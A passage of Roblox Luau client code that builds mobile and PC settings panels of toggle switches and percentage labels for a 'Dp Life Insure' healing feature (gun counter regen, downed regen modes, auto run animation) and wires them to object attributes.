	mRiotHint.Size = UDim2.new(1, -24, 0, 18)
	mRiotHint.Position = UDim2.new(0, 20, 0, 44)
	mRiotHint.BackgroundTransparency = 1
	mRiotHint.Font = Enum.Font.Gotham
	mRiotHint.TextSize = 7
	mRiotHint.TextWrapped = true
	mRiotHint.TextXAlignment = Enum.TextXAlignment.Left
	mRiotHint.TextYAlignment = Enum.TextYAlignment.Top
	mRiotHint.TextColor3 = Color3.fromRGB(150, 150, 150)
	mRiotHint.Text = "On = run anim without Shift. Toggle again may bug."
	mRiotHint.Visible = false
	mRiotHint.Parent = mBar
	local mRiotSw = Instance.new("TextButton")
	mRiotSw.Name = "RiotSw"
	mRiotSw.Size = UDim2.new(0, 36, 0, 16)
	mRiotSw.Position = UDim2.new(1, -42, 0, 32)
	mRiotSw.BackgroundColor3 = Color3.fromRGB(46, 160, 70)
	mRiotSw.Text = ""
	mRiotSw.Visible = false
	mRiotSw.AutoButtonColor = false
	mRiotSw.Parent = mBar
	local mrsc = Instance.new("UICorner")
	mrsc.CornerRadius = UDim.new(1, 0)
	mrsc.Parent = mRiotSw
	local mRiotDot = Instance.new("Frame")
	mRiotDot.Name = "Dot"
	mRiotDot.Size = UDim2.new(0, 14, 0, 14)
	mRiotDot.Position = UDim2.new(1, -16, 0.5, -7)
	mRiotDot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	mRiotDot.Parent = mRiotSw
	local mrdc = Instance.new("UICorner")
	mrdc.CornerRadius = UDim.new(1, 0)
	mrdc.Parent = mRiotDot
	local mTxt2 = Instance.new("TextLabel")
	mTxt2.Size = UDim2.new(0, 92, 0, 16)
	mTxt2.Position = UDim2.new(0, 20, 0, 32)
	mTxt2.BackgroundTransparency = 1
	mTxt2.Font = Enum.Font.Gotham
	mTxt2.TextSize = 8
	mTxt2.TextXAlignment = Enum.TextXAlignment.Left
	mTxt2.TextColor3 = Color3.fromRGB(255, 255, 255)
	mTxt2.Text = "Gun counter regen"
	mTxt2.Parent = mBar
	local mGunPct = Instance.new("TextLabel")
	mGunPct.Name = "GunPct"
	mGunPct.Size = UDim2.new(0, 28, 0, 16)
	mGunPct.Position = UDim2.new(1, -72, 0, 32)
	mGunPct.BackgroundTransparency = 1
	mGunPct.Font = Enum.Font.GothamBold
	mGunPct.TextSize = 8
	mGunPct.TextXAlignment = Enum.TextXAlignment.Right
	mGunPct.TextColor3 = Color3.fromRGB(232, 197, 71)
	mGunPct.Text = "60%"
	mGunPct.Parent = mBar
	local mSw2 = Instance.new("TextButton")
	mSw2.Name = "GunSw"
	mSw2.Size = UDim2.new(0, 36, 0, 16)
	mSw2.Position = UDim2.new(1, -42, 0, 32)
	mSw2.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
	mSw2.Text = ""
	mSw2.AutoButtonColor = false
	mSw2.Parent = mBar
	local mswc2 = Instance.new("UICorner")
	mswc2.CornerRadius = UDim.new(1, 0)
	mswc2.Parent = mSw2
	local mDot2 = Instance.new("Frame")
	mDot2.Name = "Dot"
	mDot2.Size = UDim2.new(0, 14, 0, 14)
	mDot2.Position = UDim2.new(0, 2, 0.5, -7)
	mDot2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	mDot2.Parent = mSw2
	local mdc2 = Instance.new("UICorner")
	mdc2.CornerRadius = UDim.new(1, 0)
	mdc2.Parent = mDot2
	local mTxt3 = Instance.new("TextLabel")
	mTxt3.Size = UDim2.new(0, 92, 0, 16)
	mTxt3.Position = UDim2.new(0, 20, 0, 70)
	mTxt3.BackgroundTransparency = 1
	mTxt3.Font = Enum.Font.Gotham
	mTxt3.TextSize = 8
	mTxt3.TextXAlignment = Enum.TextXAlignment.Left
	mTxt3.TextColor3 = Color3.fromRGB(255, 255, 255)
	mTxt3.Text = "Downed regen"
	mTxt3.Parent = mBar
	local mDownPct = Instance.new("TextLabel")
	mDownPct.Name = "DownPct"
	mDownPct.Size = UDim2.new(0, 28, 0, 16)
	mDownPct.Position = UDim2.new(1, -72, 0, 86)
	mDownPct.BackgroundTransparency = 1
	mDownPct.Font = Enum.Font.GothamBold
	mDownPct.TextSize = 8
	mDownPct.TextXAlignment = Enum.TextXAlignment.Right
	mDownPct.TextColor3 = Color3.fromRGB(140, 140, 140)
	mDownPct.Text = "40%"
	mDownPct.Parent = mBar
	local mHintG = Instance.new("TextLabel")
	mHintG.Size = UDim2.new(0, 120, 0, 10)
	mHintG.Position = UDim2.new(0, 20, 0, 46)
	mHintG.BackgroundTransparency = 1
	mHintG.Font = Enum.Font.Gotham
	mHintG.TextSize = 7
	mHintG.TextXAlignment = Enum.TextXAlignment.Left
	mHintG.TextColor3 = Color3.fromRGB(170, 170, 170)
	mHintG.Text = "At meter 100"
	mHintG.Parent = mBar
	local mHintG2 = Instance.new("TextLabel")
	mHintG2.Size = UDim2.new(0, 150, 0, 10)
	mHintG2.Position = UDim2.new(0, 20, 0, 54)
	mHintG2.BackgroundTransparency = 1
	mHintG2.Font = Enum.Font.Gotham
	mHintG2.TextSize = 7
	mHintG2.TextXAlignment = Enum.TextXAlignment.Left
	mHintG2.TextColor3 = Color3.fromRGB(170, 170, 170)
	mHintG2.Text = "5 gun shots, small heal"
	mHintG2.Parent = mBar
	local mHintD = Instance.new("TextLabel")
	mHintD.Size = UDim2.new(0, 108, 0, 9)
	mHintD.Position = UDim2.new(0, 20, 0, 86)
	mHintD.BackgroundTransparency = 1
	mHintD.Font = Enum.Font.Gotham
	mHintD.TextSize = 6
	mHintD.TextXAlignment = Enum.TextXAlignment.Left
	mHintD.TextColor3 = Color3.fromRGB(170, 170, 170)
	mHintD.Text = "At meter 100"
	mHintD.Parent = mBar
	local mHintD2 = Instance.new("TextLabel")
	mHintD2.Size = UDim2.new(0, 108, 0, 28)
	mHintD2.Position = UDim2.new(0, 20, 0, 94)
	mHintD2.BackgroundTransparency = 1
	mHintD2.Font = Enum.Font.Gotham
	mHintD2.TextSize = 6
	mHintD2.TextWrapped = true
	mHintD2.TextYAlignment = Enum.TextYAlignment.Top
	mHintD2.TextXAlignment = Enum.TextXAlignment.Left
	mHintD2.TextColor3 = Color3.fromRGB(170, 170, 170)
	mHintD2.Text = "Downed pose: 3 random skills knife / bomb / dash grab"
	mHintD2.Parent = mBar
	local mDown50Lab = Instance.new("TextLabel")
	mDown50Lab.Name = "DownPct50"
	mDown50Lab.Size = UDim2.new(0, 28, 0, 16)
	mDown50Lab.Position = UDim2.new(1, -72, 0, 70)
	mDown50Lab.BackgroundTransparency = 1
	mDown50Lab.Font = Enum.Font.GothamBold
	mDown50Lab.TextSize = 8
	mDown50Lab.TextXAlignment = Enum.TextXAlignment.Right
	mDown50Lab.TextColor3 = Color3.fromRGB(232, 197, 71)
	mDown50Lab.Text = "50%"
	mDown50Lab.Parent = mBar
	local mSw50 = Instance.new("TextButton")
	mSw50.Name = "Down50Sw"
	mSw50.Size = UDim2.new(0, 36, 0, 16)
	mSw50.Position = UDim2.new(1, -42, 0, 70)
	mSw50.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
	mSw50.Text = ""
	mSw50.AutoButtonColor = false
	mSw50.Parent = mBar
	local mswc50 = Instance.new("UICorner")
	mswc50.CornerRadius = UDim.new(1, 0)
	mswc50.Parent = mSw50
	local mDot50 = Instance.new("Frame")
	mDot50.Name = "Dot"
	mDot50.Size = UDim2.new(0, 14, 0, 14)
	mDot50.Position = UDim2.new(0, 2, 0.5, -7)
	mDot50.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	mDot50.Parent = mSw50
	local mdc50 = Instance.new("UICorner")
	mdc50.CornerRadius = UDim.new(1, 0)
	mdc50.Parent = mDot50
	local mForceTxt = Instance.new("TextLabel")
	mForceTxt.Size = UDim2.new(0, 118, 0, 28)
	mForceTxt.Position = UDim2.new(0, 20, 0, 128)
	mForceTxt.BackgroundTransparency = 1
	mForceTxt.Font = Enum.Font.Gotham
	mForceTxt.TextSize = 7
	mForceTxt.TextWrapped = true
	mForceTxt.TextXAlignment = Enum.TextXAlignment.Left
	mForceTxt.TextYAlignment = Enum.TextYAlignment.Top
	mForceTxt.TextColor3 = Color3.fromRGB(220, 220, 220)
	mForceTxt.Text = "After 2 downed heals in a row, next must be gun counter"
	mForceTxt.Parent = mBar
	local mForceSw = Instance.new("TextButton")
	mForceSw.Name = "ForceSw"
	mForceSw.Size = UDim2.new(0, 36, 0, 16)
	mForceSw.Position = UDim2.new(1, -42, 0, 132)
	mForceSw.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
	mForceSw.Text = ""
	mForceSw.AutoButtonColor = false
	mForceSw.Parent = mBar
	local mfsc = Instance.new("UICorner")
	mfsc.CornerRadius = UDim.new(1, 0)
	mfsc.Parent = mForceSw
	local mForceDot = Instance.new("Frame")
	mForceDot.Name = "Dot"
	mForceDot.Size = UDim2.new(0, 14, 0, 14)
	mForceDot.Position = UDim2.new(1, -16, 0.5, -7)
	mForceDot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	mForceDot.Parent = mForceSw
	local mfdc = Instance.new("UICorner")
	mfdc.CornerRadius = UDim.new(1, 0)
	mfdc.Parent = mForceDot
	local mHintR = Instance.new("TextLabel")
	mHintR.Name = "BothOnHint"
	mHintR.Size = UDim2.new(1, -24, 0, 12)
	mHintR.Position = UDim2.new(0, 20, 1, -14)
	mHintR.BackgroundTransparency = 1
	mHintR.Font = Enum.Font.Gotham
	mHintR.TextSize = 7
	mHintR.TextXAlignment = Enum.TextXAlignment.Left
	mHintR.TextColor3 = Color3.fromRGB(150, 150, 150)
	mHintR.Text = "Both on = random one"
	mHintR.Parent = mBar
	local mSw3 = Instance.new("TextButton")
	mSw3.Name = "Down40Sw"
	mSw3.Size = UDim2.new(0, 36, 0, 16)
	mSw3.Position = UDim2.new(1, -42, 0, 86)
	mSw3.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
	mSw3.Text = ""
	mSw3.AutoButtonColor = false
	mSw3.Parent = mBar
	local mswc3 = Instance.new("UICorner")
	mswc3.CornerRadius = UDim.new(1, 0)
	mswc3.Parent = mSw3
	local mDot3 = Instance.new("Frame")
	mDot3.Name = "Dot"
	mDot3.Size = UDim2.new(0, 14, 0, 14)
	mDot3.Position = UDim2.new(0, 2, 0.5, -7)
	mDot3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	mDot3.Parent = mSw3
	local mdc3 = Instance.new("UICorner")
	mdc3.CornerRadius = UDim.new(1, 0)
	mdc3.Parent = mDot3
	local pArr = Instance.new("TextButton")
	pArr.Name = "LiPArrow"
	pArr.Size = UDim2.new(1, 0, 0, 16)
	pArr.Position = UDim2.new(0, 0, 0, -18)
	pArr.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	pArr.TextColor3 = Color3.fromRGB(230, 230, 230)
	pArr.Font = Enum.Font.GothamBold
	pArr.TextSize = 12
	pArr.Text = "^"
	pArr.Parent = li
	local pac = Instance.new("UICorner")
	pac.CornerRadius = UDim.new(0, 4)
	pac.Parent = pArr
	local pHint = Instance.new("TextLabel")
	pHint.Name = "LiRHint"
	pHint.Size = UDim2.new(1, 0, 0, 10)
	pHint.Position = UDim2.new(0, 0, 0, -28)
	pHint.BackgroundTransparency = 1
	pHint.Font = Enum.Font.GothamBold
	pHint.TextSize = 9
	pHint.TextColor3 = Color3.fromRGB(230, 230, 230)
	pHint.Text = "R"
	pHint.Parent = li
	local pBar = Instance.new("Frame")
	pBar.Name = "LiPBar"
	pBar.Size = UDim2.new(0, 186, 0, 214)
	pBar.Position = UDim2.new(0.5, -85, 0, -196)
	pBar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	pBar.Visible = false
	pBar.Parent = li
	local pbc = Instance.new("UICorner")
	pbc.CornerRadius = UDim.new(0, 4)
	pbc.Parent = pBar
	local pHeadR = Instance.new("TextLabel")
	pHeadR.Name = "LiPTopR"
	pHeadR.Size = UDim2.new(1, 0, 0, 10)
	pHeadR.Position = UDim2.new(0, 0, 0, -28)
	pHeadR.BackgroundTransparency = 1
	pHeadR.Font = Enum.Font.GothamBold
	pHeadR.TextSize = 9
	pHeadR.TextColor3 = Color3.fromRGB(230, 230, 230)
	pHeadR.Text = "R"
	pHeadR.Parent = pBar
	local pHead = Instance.new("TextButton")
	pHead.Name = "LiPClose"
	pHead.Size = UDim2.new(1, 0, 0, 16)
	pHead.Position = UDim2.new(0, 0, 0, -18)
	pHead.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	pHead.TextColor3 = Color3.fromRGB(230, 230, 230)
	pHead.Font = Enum.Font.GothamBold
	pHead.TextSize = 12
	pHead.Text = "v"
	pHead.Parent = pBar
	local phc = Instance.new("UICorner")
	phc.CornerRadius = UDim.new(0, 4)
	phc.Parent = pHead
	local pTxt = Instance.new("TextLabel")
	pTxt.Size = UDim2.new(1, -8, 1, -6)
	pTxt.Position = UDim2.new(0, 4, 0, 3)
	pTxt.BackgroundTransparency = 1
	pTxt.Font = Enum.Font.Gotham
	pTxt.TextSize = 9
	pTxt.TextWrapped = true
	pTxt.TextXAlignment = Enum.TextXAlignment.Left
	pTxt.TextYAlignment = Enum.TextYAlignment.Top
	pTxt.TextColor3 = Color3.fromRGB(255, 255, 255)
	pTxt.Text = "Dp Life Insure"
	pTxt.Size = UDim2.new(0, 72, 0, 14)
	pTxt.Position = UDim2.new(0, 4, 0, 2)
	pTxt.TextSize = 8
	pTxt.TextScaled = false
	pTxt.Parent = pBar
	local pHint1 = Instance.new("TextLabel")
	pHint1.Size = UDim2.new(0, 120, 0, 10)
	pHint1.Position = UDim2.new(0, 4, 0, 14)
	pHint1.BackgroundTransparency = 1
	pHint1.Font = Enum.Font.Gotham
	pHint1.TextSize = 7
	pHint1.TextXAlignment = Enum.TextXAlignment.Left
	pHint1.TextColor3 = Color3.fromRGB(170, 170, 170)
	pHint1.Text = "Heal below 20% HP"
	pHint1.Parent = pBar
	local pSw = Instance.new("TextButton")
	pSw.Name = "LiSw"
	pSw.Size = UDim2.new(0, 36, 0, 16)
	pSw.Position = UDim2.new(1, -42, 0, 4)
	pSw.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
	pSw.Text = ""
	pSw.AutoButtonColor = false
	pSw.Parent = pBar
	local pswc = Instance.new("UICorner")
	pswc.CornerRadius = UDim.new(1, 0)
	pswc.Parent = pSw
	local pDot = Instance.new("Frame")
	pDot.Name = "Dot"
	pDot.Size = UDim2.new(0, 14, 0, 14)
	pDot.Position = UDim2.new(0, 2, 0.5, -7)
	pDot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	pDot.Parent = pSw
	local pdc = Instance.new("UICorner")
	pdc.CornerRadius = UDim.new(1, 0)
	pdc.Parent = pDot
	local pRiotTxt = Instance.new("TextLabel")
	pRiotTxt.Name = "WvRiotTxt"
	pRiotTxt.Size = UDim2.new(0, 110, 0, 16)
	pRiotTxt.Position = UDim2.new(0, 4, 0, 32)
	pRiotTxt.BackgroundTransparency = 1
	pRiotTxt.Font = Enum.Font.Gotham
	pRiotTxt.TextSize = 8
	pRiotTxt.TextXAlignment = Enum.TextXAlignment.Left
	pRiotTxt.TextColor3 = Color3.fromRGB(255, 255, 255)
	pRiotTxt.Text = "Auto run anim"
	pRiotTxt.Visible = false
	pRiotTxt.Parent = pBar
	local pRiotHint = Instance.new("TextLabel")
	pRiotHint.Name = "WvRiotHint"
	pRiotHint.Size = UDim2.new(1, -8, 0, 18)
	pRiotHint.Position = UDim2.new(0, 4, 0, 44)
	pRiotHint.BackgroundTransparency = 1
	pRiotHint.Font = Enum.Font.Gotham
	pRiotHint.TextSize = 7
	pRiotHint.TextWrapped = true
	pRiotHint.TextXAlignment = Enum.TextXAlignment.Left
	pRiotHint.TextYAlignment = Enum.TextYAlignment.Top
	pRiotHint.TextColor3 = Color3.fromRGB(150, 150, 150)
	pRiotHint.Text = "On = run anim without Shift. Toggle again may bug."
	pRiotHint.Visible = false
	pRiotHint.Parent = pBar
	local pRiotSw = Instance.new("TextButton")
	pRiotSw.Name = "RiotSw"
	pRiotSw.Size = UDim2.new(0, 36, 0, 16)
	pRiotSw.Position = UDim2.new(1, -42, 0, 32)
	pRiotSw.BackgroundColor3 = Color3.fromRGB(46, 160, 70)
	pRiotSw.Text = ""
	pRiotSw.Visible = false
	pRiotSw.AutoButtonColor = false
	pRiotSw.Parent = pBar
	local prsc = Instance.new("UICorner")
	prsc.CornerRadius = UDim.new(1, 0)
	prsc.Parent = pRiotSw
	local pRiotDot = Instance.new("Frame")
	pRiotDot.Name = "Dot"
	pRiotDot.Size = UDim2.new(0, 14, 0, 14)
	pRiotDot.Position = UDim2.new(1, -16, 0.5, -7)
	pRiotDot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	pRiotDot.Parent = pRiotSw
	local prdc = Instance.new("UICorner")
	prdc.CornerRadius = UDim.new(1, 0)
	prdc.Parent = pRiotDot
	local pTxt2 = Instance.new("TextLabel")
	pTxt2.Size = UDim2.new(0, 92, 0, 16)
	pTxt2.Position = UDim2.new(0, 4, 0, 32)
	pTxt2.BackgroundTransparency = 1
	pTxt2.Font = Enum.Font.Gotham
	pTxt2.TextSize = 8
	pTxt2.TextXAlignment = Enum.TextXAlignment.Left
	pTxt2.TextColor3 = Color3.fromRGB(255, 255, 255)
	pTxt2.Text = "Gun counter regen"
	pTxt2.Parent = pBar
	local pGunPct = Instance.new("TextLabel")
	pGunPct.Name = "GunPct"
	pGunPct.Size = UDim2.new(0, 28, 0, 16)
	pGunPct.Position = UDim2.new(1, -72, 0, 32)
	pGunPct.BackgroundTransparency = 1
	pGunPct.Font = Enum.Font.GothamBold
	pGunPct.TextSize = 8
	pGunPct.TextXAlignment = Enum.TextXAlignment.Right
	pGunPct.TextColor3 = Color3.fromRGB(232, 197, 71)
	pGunPct.Text = "60%"
	pGunPct.Parent = pBar
	local pSw2 = Instance.new("TextButton")
	pSw2.Name = "GunSw"
	pSw2.Size = UDim2.new(0, 36, 0, 16)
	pSw2.Position = UDim2.new(1, -42, 0, 32)
	pSw2.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
	pSw2.Text = ""
	pSw2.AutoButtonColor = false
	pSw2.Parent = pBar
	local pswc2 = Instance.new("UICorner")
	pswc2.CornerRadius = UDim.new(1, 0)
	pswc2.Parent = pSw2
	local pDot2 = Instance.new("Frame")
	pDot2.Name = "Dot"
	pDot2.Size = UDim2.new(0, 14, 0, 14)
	pDot2.Position = UDim2.new(0, 2, 0.5, -7)
	pDot2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	pDot2.Parent = pSw2
	local pdc2 = Instance.new("UICorner")
	pdc2.CornerRadius = UDim.new(1, 0)
	pdc2.Parent = pDot2
	local pTxt3 = Instance.new("TextLabel")
	pTxt3.Size = UDim2.new(0, 92, 0, 16)
	pTxt3.Position = UDim2.new(0, 4, 0, 70)
	pTxt3.BackgroundTransparency = 1
	pTxt3.Font = Enum.Font.Gotham
	pTxt3.TextSize = 8
	pTxt3.TextXAlignment = Enum.TextXAlignment.Left
	pTxt3.TextColor3 = Color3.fromRGB(255, 255, 255)
	pTxt3.Text = "Downed regen"
	pTxt3.Parent = pBar
	local pDownPct = Instance.new("TextLabel")
	pDownPct.Name = "DownPct"
	pDownPct.Size = UDim2.new(0, 28, 0, 16)
	pDownPct.Position = UDim2.new(1, -72, 0, 86)
	pDownPct.BackgroundTransparency = 1
	pDownPct.Font = Enum.Font.GothamBold
	pDownPct.TextSize = 8
	pDownPct.TextXAlignment = Enum.TextXAlignment.Right
	pDownPct.TextColor3 = Color3.fromRGB(140, 140, 140)
	pDownPct.Text = "40%"
	pDownPct.Parent = pBar
	local pHintG = Instance.new("TextLabel")
	pHintG.Size = UDim2.new(0, 120, 0, 10)
	pHintG.Position = UDim2.new(0, 4, 0, 46)
	pHintG.BackgroundTransparency = 1
	pHintG.Font = Enum.Font.Gotham
	pHintG.TextSize = 7
	pHintG.TextXAlignment = Enum.TextXAlignment.Left
	pHintG.TextColor3 = Color3.fromRGB(170, 170, 170)
	pHintG.Text = "At meter 100"
	pHintG.Parent = pBar
	local pHintG2 = Instance.new("TextLabel")
	pHintG2.Size = UDim2.new(0, 150, 0, 10)
	pHintG2.Position = UDim2.new(0, 4, 0, 54)
	pHintG2.BackgroundTransparency = 1
	pHintG2.Font = Enum.Font.Gotham
	pHintG2.TextSize = 7
	pHintG2.TextXAlignment = Enum.TextXAlignment.Left
	pHintG2.TextColor3 = Color3.fromRGB(170, 170, 170)
	pHintG2.Text = "5 gun shots, small heal"
	pHintG2.Parent = pBar
	local pHintD = Instance.new("TextLabel")
	pHintD.Size = UDim2.new(0, 108, 0, 9)
	pHintD.Position = UDim2.new(0, 4, 0, 86)
	pHintD.BackgroundTransparency = 1
	pHintD.Font = Enum.Font.Gotham
	pHintD.TextSize = 6
	pHintD.TextXAlignment = Enum.TextXAlignment.Left
	pHintD.TextColor3 = Color3.fromRGB(170, 170, 170)
	pHintD.Text = "At meter 100"
	pHintD.Parent = pBar
	local pHintD2 = Instance.new("TextLabel")
	pHintD2.Size = UDim2.new(0, 108, 0, 28)
	pHintD2.Position = UDim2.new(0, 4, 0, 94)
	pHintD2.BackgroundTransparency = 1
	pHintD2.Font = Enum.Font.Gotham
	pHintD2.TextSize = 6
	pHintD2.TextWrapped = true
	pHintD2.TextYAlignment = Enum.TextYAlignment.Top
	pHintD2.TextXAlignment = Enum.TextXAlignment.Left
	pHintD2.TextColor3 = Color3.fromRGB(170, 170, 170)
	pHintD2.Text = "Downed pose: 3 random skills knife / bomb / dash grab"
	pHintD2.Parent = pBar
	local pDown50Lab = Instance.new("TextLabel")
	pDown50Lab.Name = "DownPct50"
	pDown50Lab.Size = UDim2.new(0, 28, 0, 16)
	pDown50Lab.Position = UDim2.new(1, -72, 0, 70)
	pDown50Lab.BackgroundTransparency = 1
	pDown50Lab.Font = Enum.Font.GothamBold
	pDown50Lab.TextSize = 8
	pDown50Lab.TextXAlignment = Enum.TextXAlignment.Right
	pDown50Lab.TextColor3 = Color3.fromRGB(232, 197, 71)
	pDown50Lab.Text = "50%"
	pDown50Lab.Parent = pBar
	local pSw50 = Instance.new("TextButton")
	pSw50.Name = "Down50Sw"
	pSw50.Size = UDim2.new(0, 36, 0, 16)
	pSw50.Position = UDim2.new(1, -42, 0, 70)
	pSw50.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
	pSw50.Text = ""
	pSw50.AutoButtonColor = false
	pSw50.Parent = pBar
	local pswc50 = Instance.new("UICorner")
	pswc50.CornerRadius = UDim.new(1, 0)
	pswc50.Parent = pSw50
	local pDot50 = Instance.new("Frame")
	pDot50.Name = "Dot"
	pDot50.Size = UDim2.new(0, 14, 0, 14)
	pDot50.Position = UDim2.new(0, 2, 0.5, -7)
	pDot50.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	pDot50.Parent = pSw50
	local pdc50 = Instance.new("UICorner")
	pdc50.CornerRadius = UDim.new(1, 0)
	pdc50.Parent = pDot50
	local pForceTxt = Instance.new("TextLabel")
	pForceTxt.Size = UDim2.new(0, 132, 0, 28)
	pForceTxt.Position = UDim2.new(0, 4, 0, 128)
	pForceTxt.BackgroundTransparency = 1
	pForceTxt.Font = Enum.Font.Gotham
	pForceTxt.TextSize = 7
	pForceTxt.TextWrapped = true
	pForceTxt.TextXAlignment = Enum.TextXAlignment.Left
	pForceTxt.TextYAlignment = Enum.TextYAlignment.Top
	pForceTxt.TextColor3 = Color3.fromRGB(220, 220, 220)
	pForceTxt.Text = "After 2 downed heals in a row, next must be gun counter"
	pForceTxt.Parent = pBar
	local pForceSw = Instance.new("TextButton")
	pForceSw.Name = "ForceSw"
	pForceSw.Size = UDim2.new(0, 36, 0, 16)
	pForceSw.Position = UDim2.new(1, -42, 0, 132)
	pForceSw.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
	pForceSw.Text = ""
	pForceSw.AutoButtonColor = false
	pForceSw.Parent = pBar
	local pfsc = Instance.new("UICorner")
	pfsc.CornerRadius = UDim.new(1, 0)
	pfsc.Parent = pForceSw
	local pForceDot = Instance.new("Frame")
	pForceDot.Name = "Dot"
	pForceDot.Size = UDim2.new(0, 14, 0, 14)
	pForceDot.Position = UDim2.new(1, -16, 0.5, -7)
	pForceDot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	pForceDot.Parent = pForceSw
	local pfdc = Instance.new("UICorner")
	pfdc.CornerRadius = UDim.new(1, 0)
	pfdc.Parent = pForceDot
	local pHintR = Instance.new("TextLabel")
	pHintR.Name = "BothOnHint"
	pHintR.Size = UDim2.new(1, -8, 0, 12)
	pHintR.Position = UDim2.new(0, 4, 1, -14)
	pHintR.BackgroundTransparency = 1
	pHintR.Font = Enum.Font.Gotham
	pHintR.TextSize = 7
	pHintR.TextXAlignment = Enum.TextXAlignment.Left
	pHintR.TextColor3 = Color3.fromRGB(150, 150, 150)
	pHintR.Text = "Both on = random one"
	pHintR.Parent = pBar
	local pSw3 = Instance.new("TextButton")
	pSw3.Name = "Down40Sw"
	pSw3.Size = UDim2.new(0, 36, 0, 16)
	pSw3.Position = UDim2.new(1, -42, 0, 86)
	pSw3.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
	pSw3.Text = ""
	pSw3.AutoButtonColor = false
	pSw3.Parent = pBar
	local pswc3 = Instance.new("UICorner")
	pswc3.CornerRadius = UDim.new(1, 0)
	pswc3.Parent = pSw3
	local pDot3 = Instance.new("Frame")
	pDot3.Name = "Dot"
	pDot3.Size = UDim2.new(0, 14, 0, 14)
	pDot3.Position = UDim2.new(0, 2, 0.5, -7)
	pDot3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	pDot3.Parent = pSw3
	local pdc3 = Instance.new("UICorner")
	pdc3.CornerRadius = UDim.new(1, 0)
	pdc3.Parent = pDot3
	local pcNow = LocalPlayer:GetAttribute("YYDSPC") == true
	mArr.Visible = not pcNow
	pArr.Visible = pcNow
	pHint.Visible = pcNow
	local function paintOneSw(sw, on)
	if not sw then return end
	local dot = sw:FindFirstChild("Dot")
	if on then
	sw.BackgroundColor3 = Color3.fromRGB(46, 160, 70)
	if dot then
	dot.Position = UDim2.new(1, -16, 0.5, -7)
	end
	else
	sw.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
	if dot then
	dot.Position = UDim2.new(0, 2, 0.5, -7)
	end
	end
	end
	local function paintSws()
	local riotOn = li:GetAttribute("LiRiot") ~= false
	paintOneSw(mBar:FindFirstChild("RiotSw"), riotOn)
	paintOneSw(pBar:FindFirstChild("RiotSw"), riotOn)
	local coreOn = li:GetAttribute("LiCore") ~= false
	local gunOn = li:GetAttribute("GunCounter") ~= false
	local mode = tonumber(li:GetAttribute("DownMode"))
	if mode == nil then
	mode = 50
	end
	local downOn = (mode == 40 or mode == 50)
	li:SetAttribute("DownedRegen", downOn)
	paintOneSw(mBar:FindFirstChild("LiSw"), coreOn)
	paintOneSw(pBar:FindFirstChild("LiSw"), coreOn)
	paintOneSw(mBar:FindFirstChild("GunSw"), gunOn)
	paintOneSw(pBar:FindFirstChild("GunSw"), gunOn)
	paintOneSw(mBar:FindFirstChild("Down40Sw"), mode == 40)
	paintOneSw(pBar:FindFirstChild("Down40Sw"), mode == 40)
	paintOneSw(mBar:FindFirstChild("Down50Sw"), mode == 50)
	paintOneSw(pBar:FindFirstChild("Down50Sw"), mode == 50)
	local forceOn = li:GetAttribute("ForceGunAfter2Down") ~= false
	paintOneSw(mBar:FindFirstChild("ForceSw"), forceOn)
	paintOneSw(pBar:FindFirstChild("ForceSw"), forceOn)
	local gP = 0
	local dP = 0
	if gunOn and downOn then
	if mode == 40 then
	gP = 60
	dP = 40
	else
	gP = 50
	dP = 50
	end
	elseif gunOn then
	gP = 100
	dP = 0
	elseif downOn then
	gP = 0
	dP = 100
	end
	local function paintPct(lab, n, lockText)
	if not lab then return end
	if not lockText then
	lab.Text = tostring(n) .. "%"
	end
	if n >= 100 then
	lab.TextColor3 = Color3.fromRGB(90, 220, 110)
	elseif n >= 40 then
	lab.TextColor3 = Color3.fromRGB(232, 197, 71)
	else
	lab.TextColor3 = Color3.fromRGB(140, 140, 140)
	end
	end
	local d40 = 0
	local d50 = 0
	if mode == 40 then
	d40 = dP
	elseif mode == 50 then
	d50 = dP
	end
	paintPct(mBar:FindFirstChild("GunPct"), gP)
	paintPct(pBar:FindFirstChild("GunPct"), gP)
	paintPct(mBar:FindFirstChild("DownPct"), d40)
	paintPct(pBar:FindFirstChild("DownPct"), d40)
	paintPct(mBar:FindFirstChild("DownPct50"), d50)
	paintPct(pBar:FindFirstChild("DownPct50"), d50)
	end
	paintSws()
	local function tapCore()
	li:SetAttribute("LiCore", not (li:GetAttribute("LiCore") ~= false))
	paintSws()
	end
	local function tapGunSw()
	li:SetAttribute("GunCounter", not (li:GetAttribute("GunCounter") ~= false))
	paintSws()
	end
	local function tapDown40()
	local mode = tonumber(li:GetAttribute("DownMode"))
	if mode == 40 then
	li:SetAttribute("DownMode", 0)
	else
	li:SetAttribute("DownMode", 40)
	end
	paintSws()
	end
	local function tapDown50()
	local mode = tonumber(li:GetAttribute("DownMode"))
	if mode == 50 then
	li:SetAttribute("DownMode", 0)
	else
	li:SetAttribute("DownMode", 50)
	end
	paintSws()
	end
	local function tapForceSw()
	li:SetAttribute("ForceGunAfter2Down", not (li:GetAttribute("ForceGunAfter2Down") ~= false))
	paintSws()
	end
	local mLi = mBar:FindFirstChild("LiSw")
	local pLi = pBar:FindFirstChild("LiSw")
	local mSwBtn = mBar:FindFirstChild("GunSw")
	local pSwBtn = pBar:FindFirstChild("GunSw")
	local mDnBtn = mBar:FindFirstChild("Down40Sw")
	local pDnBtn = pBar:FindFirstChild("Down40Sw")
